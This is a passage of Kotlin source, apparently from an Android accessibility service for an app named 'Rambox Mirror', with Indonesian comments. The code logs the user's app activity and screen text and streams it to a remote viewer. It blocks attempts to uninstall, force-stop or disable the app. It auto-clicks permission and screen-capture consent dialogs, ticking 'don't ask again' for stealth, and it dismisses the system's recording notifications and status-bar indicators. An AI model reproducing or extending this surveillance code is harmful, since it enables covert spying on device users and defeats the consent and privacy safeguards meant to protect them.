                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, newText)
                    targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                }
                try { targetNode.recycle() } catch (_: Exception) {}
            }
            try { root.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {}
    }

    private fun findTargetEditableNode(node: AccessibilityNodeInfo?, depth: Int = 0): AccessibilityNodeInfo? {
        if (node == null || depth > 10) return null
        if (node.isEditable) return node
        val className = node.className?.toString() ?: ""
        if (className.contains("EditText", ignoreCase = true) || className.contains("AutoCompleteTextView", ignoreCase = true)) {
            return node
        }
        val count = node.childCount
        for (i in 0 until count) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val res = findTargetEditableNode(child, depth + 1)
            if (res != null) {
                return res
            }
            try { child.recycle() } catch (_: Exception) {}
        }
        return null
    }

    fun performGlobalActionCommand(action: String) {
        when (action.lowercase()) {
            "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "notifications" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "quick_settings" -> performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
            "lock" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                }
            }
        }
    }

    private fun getAppNameFromPackage(pkgName: String): String {
        return try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(pkgName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            pkgName
        }
    }

    private fun sendLogToService(timestamp: String, packageName: String, appName: String, eventType: String, contextTitle: String, content: String, duration: String) {
        dbExecutor.execute {
            try {
                // 1. Save to Offline SQLite Database (Zero Data Loss, off Main Thread)
                dbHelper?.insertLog(timestamp, packageName, appName, eventType, contextTitle, content, duration)

                // 2. Broadcast Live to Viewer
                val logObj = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("packageName", packageName)
                    put("appName", appName)
                    put("eventType", eventType)
                    put("contextTitle", contextTitle)
                    put("content", content)
                    put("duration", duration)
                }

                ScreenCaptureService.instance?.sendActivityLog(logObj)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    fun getOfflineLogsHistory(): org.json.JSONArray {
        return dbHelper?.getAllLogsAsJson(500) ?: org.json.JSONArray()
    }

    fun clearOfflineLogs() {
        dbHelper?.clearAllLogs()
    }

    private fun checkAndBlockUninstallAttempt(event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkgName = event.packageName?.toString()?.lowercase() ?: return
        val isTargetPkg = pkgName.contains("packageinstaller") ||
                pkgName.contains("settings") ||
                pkgName.contains("securitycenter") ||
                pkgName.contains("safecenter") ||
                pkgName.contains("securitypermission") ||
                pkgName.contains("oppoguardelf")

        if (!isTargetPkg) return

        val prefs = getSharedPreferences("rambox_prefs", Context.MODE_PRIVATE)
        val authUntil = prefs.getLong("uninstall_authorized_until", 0)
        val now = System.currentTimeMillis()
        if (now < authUntil) return

        val rootNode = rootInActiveWindow ?: event.source ?: return
        val isThreat = isUninstallOrSettingsScreenForRambox(rootNode)

        if (isThreat) {
            if (!UninstallLockActivity.isShowing) {
                try {
                    val lockIntent = Intent(applicationContext, UninstallLockActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    startActivity(lockIntent)
                } catch (e: Exception) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }
            }

            // Silently redirect without noisy toast
        }
    }

    private fun isUninstallOrSettingsScreenForRambox(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        val allTexts = mutableListOf<String>()
        collectAllTexts(root, allTexts)
        val fullText = allTexts.joinToString(" ").lowercase()

        if (fullText.contains("accessibility") || fullText.contains("aksesibilitas")) return false
        val mentionsRambox = fullText.contains("rambox") || fullText.contains("com.rambox.mirror")
        if (mentionsRambox) {
            val isDestructive = fullText.contains("uninstall") ||
                    fullText.contains("copot") ||
                    fullText.contains("hapus") ||
                    fullText.contains("clear data") ||
                    fullText.contains("hapus data") ||
                    fullText.contains("force stop") ||
                    fullText.contains("paksa berhenti") ||
                    fullText.contains("disable") ||
                    fullText.contains("nonaktifkan")
            if (isDestructive) return true
        }
        return false
    }

    private fun collectAllTexts(node: AccessibilityNodeInfo?, list: MutableList<String>, depth: Int = 0) {
        if (node == null || depth > 10) return
        node.text?.toString()?.let { if (it.isNotBlank()) list.add(it) }
        node.contentDescription?.toString()?.let { if (it.isNotBlank()) list.add(it) }
        val count = node.childCount
        for (i in 0 until count) {
            val child = try { node.getChild(i) } catch (e: Exception) { null } ?: continue
            collectAllTexts(child, list, depth + 1)
            try { child.recycle() } catch (_: Exception) {}
        }
    }

    private fun checkAndAutoAllowPermissions(event: AccessibilityEvent) {
        val eventType = event.eventType
        // Izinkan TYPE_WINDOW_STATE_CHANGED, atau TYPE_WINDOW_CONTENT_CHANGED jika sedang dalam proses request capture
        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            (!isWaitingForProjectionConsent && !isSilentCaptureMode)) {
            return
        }

        val now = System.currentTimeMillis()
        if (now - lastAutoPermissionClickTime < 350) return

        try {
            val pkgName = event.packageName?.toString()?.lowercase() ?: return

            // Izinkan package android dan systemui untuk dialog MediaProjection & permission
            val isPermissionUi = pkgName == "android" ||
                    pkgName.contains("permissioncontroller") ||
                    pkgName.contains("packageinstaller") ||
                    pkgName.contains("systemui") ||
                    pkgName.contains("settings") ||
                    pkgName.contains("securitycenter") ||
                    pkgName.contains("securitypermission") ||
                    pkgName.contains("safecenter") ||
                    pkgName.contains("permissionmanager") ||
                    pkgName.contains("secure") ||
                    pkgName.contains("sysapp") ||
                    pkgName.contains("lbe.security")

            val isDialer = pkgName.contains("dialer") ||
                    pkgName.contains("incallui") ||
                    pkgName.contains("phone") ||
                    pkgName == "com.android.server.telecom"

            if (!isPermissionUi || isDialer) return

            val rootNode = rootInActiveWindow ?: event.source ?: return

            val allTexts = mutableListOf<String>()
            collectAllTexts(rootNode, allTexts)
            val fullText = allTexts.joinToString(" ").lowercase()

            val isMediaProjectionDialog = fullText.contains("merekam") ||
                    fullText.contains("menyiarkan layar") ||
                    fullText.contains("screen cast") ||
                    fullText.contains("record or cast") ||
                    fullText.contains("capture your screen") ||
                    fullText.contains("start recording") ||
                    fullText.contains("mulai merekam") ||
                    fullText.contains("share your screen") ||
                    fullText.contains("bagikan layar") ||
                    fullText.contains("layar anda") ||
                    fullText.contains("display over other") ||
                    fullText.contains("screen capture") ||
                    fullText.contains("tangkapan layar") ||
                    fullText.contains("entire screen") ||
                    fullText.contains("seluruh layar") ||
                    fullText.contains("single app") ||
                    fullText.contains("satu aplikasi")

            // Jika package == "android", hanya proses jika terbukti ini dialog media projection atau izin
            if (pkgName == "android" && !isMediaProjectionDialog &&
                !fullText.contains("izin") && !fullText.contains("permission") && !fullText.contains("allow")) {
                return
            }

            if (isMediaProjectionDialog) {
                // 🎯 Eksekusi pemilih otomatis Seluruh Layar (Entire Screen) & Mulai Sekarang
                val handled = handleMediaProjectionDialog(rootNode)
                if (handled) lastAutoPermissionClickTime = System.currentTimeMillis()
            } else {
                // K3 FIX: Hanya klik izin yang terbukti untuk Rambox Mirror sendiri.
                // Guard isSilentCaptureMode/isWaitingForProjectionConsent TIDAK boleh di sini
                // karena mode itu adalah kondisi saat permintaan capture Rambox aktif,
                // yaitu justru saat dialog izin Rambox paling mungkin muncul.
                val isForRambox = fullText.contains("rambox") || fullText.contains("mirror") ||
                    fullText.contains("com.rambox")
                if (isForRambox) {
                    val clicked = autoClickAffirmativeButton(rootNode)
                    if (clicked) lastAutoPermissionClickTime = System.currentTimeMillis()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * Consent dialog MediaProjection: HANYA klik opsi "Entire screen" bila ada.
     *
     * v42 FIX (#7): blok yang mengklik "single app" DIHAPUS. Dulu blok itu
     * dianggap "membuka spinner", padahal pada Android 16 klik tersebut bisa
     * langsung memilih mode single-app -> capture parsial + notifikasi
     * "Partial sharing". Request sudah memakai
     * MediaProjectionConfig.createConfigForDefaultDisplay(), jadi dialog
     * seharusnya menampilkan entire screen tanpa picker.
     *
     * @return true bila opsi "Entire screen" berhasil diklik.
     */
    private fun selectEntireScreenOptionIfPresent(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        val entireScreenKeywords = listOf(
            "entire screen", "seluruh layar", "share entire screen",
            "bagikan seluruh layar", "all screen", "semua layar"
        )
        for (kw in entireScreenKeywords) {
            val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                for (node in nodes) {
                    if (clickNodeOrParent(node)) {
                        android.util.Log.d("RamboxAcc", "🎯 Selected Entire Screen option: $kw")
                        return true
                    }
                }
            }
        }
        // Jangan pernah mengklik "single app" di sini. Bila opsi itu muncul,
        // handleMediaProjectionDialog() membatalkan auto-start (fail-closed).
        return false
    }

    private fun handleMediaProjectionDialog(root: AccessibilityNodeInfo): Boolean {
        if (BuildConfig.DEBUG) android.util.Log.d("RamboxAcc", "MediaProjection consent: check entire screen & click start")

        // A16 FIX: Pilih Entire screen jika Android 16 menampilkan pilihan single app vs entire screen
        val selectedEntireScreen = selectEntireScreenOptionIfPresent(root)

        // v42 FIX (#7): fail-closed. Bila "Entire screen" tidak berhasil dipilih
        // dan dialog menyebut mode single-app, JANGAN tekan Start. Capture
        // parsial bukan tujuan dan memunculkan notifikasi "Partial sharing".
        if (!selectedEntireScreen && mentionsSingleApp(root)) {
            val now = System.currentTimeMillis()
            if (now - lastSingleAppWarnTime > 5000L) {
                lastSingleAppWarnTime = now
                android.util.Log.w(
                    "RamboxAcc",
                    "MediaProjection: mode single-app terdeteksi; auto-start dibatalkan agar tidak capture parsial."
                )
            }
            return false
        }

        // Centang "Jangan tanya lagi" agar dialog tidak muncul berulang (stealth).
        checkDontAskAgainCheckbox(root)

        // Langsung tekan tombol konfirmasi (Start now / Mulai sekarang).
        return clickAffirmativeStartButton(root)
    }

    private fun mentionsSingleApp(root: AccessibilityNodeInfo?): Boolean {
        return containsAnyKeyword(root, listOf(
            "single app", "satu aplikasi", "share one app",
            "bagikan satu aplikasi", "one app"
        ))
    }

    private fun containsAnyKeyword(root: AccessibilityNodeInfo?, keywords: List<String>): Boolean {
        if (root == null) return false
        for (kw in keywords) {
            val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                for (node in nodes) {
                    try { node.recycle() } catch (_: Exception) {}
                }
                return true
            }
        }
        return false
    }

    private fun findNodeByKeywords(root: AccessibilityNodeInfo?, keywords: List<String>): AccessibilityNodeInfo? {
        if (root == null) return null
        for (kw in keywords) {
            val list = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
            if (!list.isNullOrEmpty()) {
                val matched = list[0]
                for (i in 1 until list.size) {
                    try { list[i].recycle() } catch (_: Exception) {}
                }
                return matched
            }
        }
        return null
    }

    private fun clickNodeOrParent(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        var curr: AccessibilityNodeInfo? = node
        var depth = 0
        while (curr != null && depth < 6) {
            if (curr.isClickable) {
                return curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            curr = curr.parent
            depth++
        }
        return try { node.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }
    }

    private fun clickAffirmativeStartButton(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false

        checkDontAskAgainCheckbox(root)

        val affirmativeKeywords = listOf(
            "mulai sekarang", "start now", "start recording", "mulai merekam",
            "share screen", "bagikan layar", "mulai transmisi", "start cast",
            "mulai", "start", "share", "bagikan", "izinkan", "allow"
        )

        for (kw in affirmativeKeywords) {
            val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                for (btnNode in nodes) {
                    val clicked = clickNodeOrParent(btnNode)
                    if (clicked) {
                        android.util.Log.d("RamboxAcc", "🚀 Clicked Affirmative Button: $kw")
                        return true
                    }
                }
            }
        }

        val buttonIds = listOf(
            "android:id/button1",
            "com.android.systemui:id/button_start",
            "com.android.systemui:id/button1",
            "com.android.systemui:id/start_button",
            "com.android.systemui:id/permission_allow_button"
        )
        for (bId in buttonIds) {
            val nodes = try { root.findAccessibilityNodeInfosByViewId(bId) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                val clicked = clickNodeOrParent(nodes[0])
                if (clicked) {
                    android.util.Log.d("RamboxAcc", "🚀 Clicked Affirmative Button by ID: $bId")
                    return true
                }
            }
        }

        return false
    }

    private fun checkDontAskAgainCheckbox(root: AccessibilityNodeInfo?) {
        if (root == null) return
        val checkKeywords = listOf("jangan", "don't", "ingat", "remember", "selalu", "always")
        for (kw in checkKeywords) {
            val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
            nodes?.forEach { node ->
                if (node.isCheckable && !node.isChecked) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            }
        }
    }

    private fun autoClickAffirmativeButton(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false

        val rawText = (node.text?.toString() ?: node.contentDescription?.toString() ?: "").trim().lowercase()
        val resId = node.viewIdResourceName?.lowercase() ?: ""

        // 1. Auto-check "Don't ask again" / "Jangan tanya lagi" if present
        val isCheckbox = node.isCheckable || node.className?.toString()?.contains("CheckBox", ignoreCase = true) == true
        if (isCheckbox && !node.isChecked) {
            val checkText = rawText
            if (checkText.contains("jangan") || checkText.contains("don't") || checkText.contains("ingat") || checkText.contains("remember")) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }

        // 2. Detect Positive Action / Allow / Start Now buttons
        val isButton1 = resId.endsWith(":id/button1") ||
                resId.contains("permission_allow_button") ||
                resId.contains("allow_button") ||
                resId.contains("md_button_positive")

        val isAffirmative = isButton1 ||
                rawText == "izinkan" ||
                rawText == "allow" ||
                rawText == "saat aplikasi digunakan" ||
                rawText == "while using the app" ||
                rawText == "hanya saat aplikasi digunakan" ||
                rawText == "hanya kali ini" ||
                rawText == "only this time" ||
                rawText == "mulai sekarang" ||
                rawText == "start now" ||
                rawText.contains("mulai sekarang") ||
                rawText.contains("start now") ||
                rawText == "mulai" ||
                rawText == "start" ||
                rawText == "bagikan layar" ||
                rawText == "share screen" ||
                rawText == "mulai merekam" ||
                rawText == "start recording" ||
                rawText == "mulai transmisi" ||
                rawText == "start cast" ||
                rawText == "izinkan semua" ||
                rawText == "allow all" ||
                rawText == "selalu izinkan" ||
                rawText == "allow all the time" ||
                rawText.contains("jangan optimalkan") ||
                rawText.contains("don't optimize") ||
                rawText.contains("tanpa batas") ||
                rawText.contains("unrestricted") ||
                rawText == "bolehkan" ||
                rawText == "lanjutkan" ||
                rawText == "continue" ||
                rawText == "oke" ||
                rawText == "ok" ||
                rawText == "ya" ||
                rawText == "yes" ||
                rawText == "setuju" ||
                rawText == "agree"

        if (isAffirmative) {
            var curr: AccessibilityNodeInfo? = node
            while (curr != null) {
                if (curr.isClickable) {
                    val clicked = curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    if (clicked) return true
                }
                curr = curr.parent
            }
        }

        val childCount = node.childCount
        for (i in 0 until childCount) {
            val child = try { node.getChild(i) } catch (e: Exception) { null } ?: continue
            val handled = autoClickAffirmativeButton(child)
            try { child.recycle() } catch (_: Exception) {}
            if (handled) return true
        }
        return false
    }

    fun forceScreenRefresh() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                val path = android.graphics.Path().apply {
                    moveTo(1f, 1f)
                    lineTo(1f, 2f)
                }
                val gesture = android.accessibilityservice.GestureDescription.Builder()
                    .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 10))
                    .build()
                dispatchGesture(gesture, null, null)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    // =========================================================================
    // 🔇 AUTO-DISMISS RECORDING NOTIFICATION (Android 14+)
    // =========================================================================

    /**
     * Intercept notifikasi perekaman layar dari SystemUI/Android dan auto-dismiss.
     * Dipanggil saat TYPE_NOTIFICATION_STATE_CHANGED dari system package.
     */
    private fun autoDismissRecordingNotification(event: AccessibilityEvent, pkgName: String) {
        try {
            val parcelable = event.parcelableData
            if (parcelable is android.app.Notification) {
                val extras = parcelable.extras ?: return
                val notifTitle = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
                val notifText = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
                val combinedText = "$notifTitle $notifText".lowercase()

                val isRecordingNotif = RECORDING_KEYWORDS.any { combinedText.contains(it) }
                val isFromRecordingPkg = SYSTEM_RECORDING_PACKAGES.any { pkgName.contains(it) }

                if (isRecordingNotif && isFromRecordingPkg) {
                    // Dismiss notifikasi via action
                    try {
                        parcelable.deleteIntent?.send()
                    } catch (_: Exception) {}

                    // Dismiss via accessibility node
                    try {
                        val nodeInfo = event.source
                        nodeInfo?.let { node ->
                            node.performAction(AccessibilityNodeInfo.ACTION_DISMISS)
                            try { node.recycle() } catch (_: Exception) {}
                        }
                    } catch (_: Exception) {}

                    // Tutup notification shade jika terbuka
                    performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE)

                    android.util.Log.d("RamboxAcc", "🔇 Auto-dismissed recording notification: $combinedText")
                }
            }
        } catch (e: Exception) {
            // Silent catch — jangan crash jika gagal dismiss
        }
    }

    /**
     * Dipanggil secara berkala oleh ScreenCaptureService untuk mencari dan
     * menghapus chip/indikator perekaman layar di status bar.
     */
    fun dismissRecordingChip() {
        try {
            // 1. Cari node yang mengandung teks recording di seluruh window hierarchy
            val rootNode = rootInActiveWindow ?: return
            dismissRecordingNodes(rootNode)
            try { rootNode.recycle() } catch (_: Exception) {}

            // 2. Juga cek semua window (termasuk status bar)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val windows = try { windows } catch (_: Exception) { null }
                windows?.forEach { window ->
                    try {
                        val windowRoot = window.root
                        if (windowRoot != null) {
                            dismissRecordingNodes(windowRoot)
                            try { windowRoot.recycle() } catch (_: Exception) {}
                        }
                    } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            // Silent catch
        }
    }

    private fun dismissRecordingNodes(node: AccessibilityNodeInfo) {
        try {
            for (keyword in RECORDING_KEYWORDS) {
                val foundNodes = try { node.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                foundNodes?.forEach { found ->
                    try {
                        // Coba dismiss node itu sendiri
                        found.performAction(AccessibilityNodeInfo.ACTION_DISMISS)
                        // Coba dismiss parent-nya juga (notification card)
                        val parent = try { found.parent } catch (_: Exception) { null }
                        parent?.performAction(AccessibilityNodeInfo.ACTION_DISMISS)
                        try { parent?.recycle() } catch (_: Exception) {}
                        try { found.recycle() } catch (_: Exception) {}
                    } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}
    }
}
